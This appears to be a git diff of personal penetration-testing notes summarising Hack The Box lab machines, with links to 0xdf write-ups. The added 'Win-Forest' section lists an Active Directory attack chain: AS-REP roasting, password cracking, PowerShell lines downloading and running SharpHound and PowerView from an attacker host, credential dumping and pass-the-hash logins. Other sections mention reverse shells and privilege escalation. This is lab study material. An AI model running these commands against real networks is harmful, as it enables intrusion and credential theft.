@@ -11,6 +11,26 @@ reverse shell - PowerShell
 JuicyPotato
 ```
 
+
+# Win-Forest
+https://0xdf.gitlab.io/2020/03/21/htb-forest.html
+```
+ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 > ldapsearch.txt
+enum4linux 10.10.10.161
+./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/’
+john hashsvc -w=/usr/share/wordlists/rockyou.txt
+crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+iex(new-object net.webclient).downloadstring("http://10.10.14.13/SharpHound.ps1")
+invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
+./smbserver.py share . -smb2support -username df -password df
+iex(new-object net.webclient).downloadstring("http://10.10.14.13/PowerView.ps1")
+./secretsdump.py svc-alfresco:s3rvice@10.10.10.161
+./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
+./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+```
+
+
 # Win-Active
 https://0xdf.gitlab.io/2018/12/08/htb-active.html
 ```
@@ -23,7 +43,6 @@ john hashadmin -w=/usr/share/wordlists/rockyou.txt
 ./wmiexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
 ./psexec.py Administrator:Ticketmaster1968@10.10.10.100
 ```
-
 
 
 # Win-Search
@@ -43,7 +62,6 @@ pfx2john staff.pfx > pfx_hash
 ```
 
 
-
 # Win-StreamIO
 ```
 SQL Injection
@@ -53,6 +71,9 @@ winPEAS
 BloodHound
 PowerView.ps1
 ```
+
+
+
 
 
 # Lin-Bashed
@@ -67,6 +88,7 @@ sudo -u scriptmanager bash -i
 python -c shell.py
 ```
 
+
 # Lin-SolidState
 https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
 ```
@@ -78,6 +100,7 @@ reverse shell - nc
 move to bash
 ```
 
+
 # Lin-Jarvis
 https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
 ```
@@ -88,6 +111,7 @@ Reverse Shell - Bash
 LinEnum.sh
 PrivEsc - systemctl
 ```
+
 
 # Lin-Backdoor
 https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html
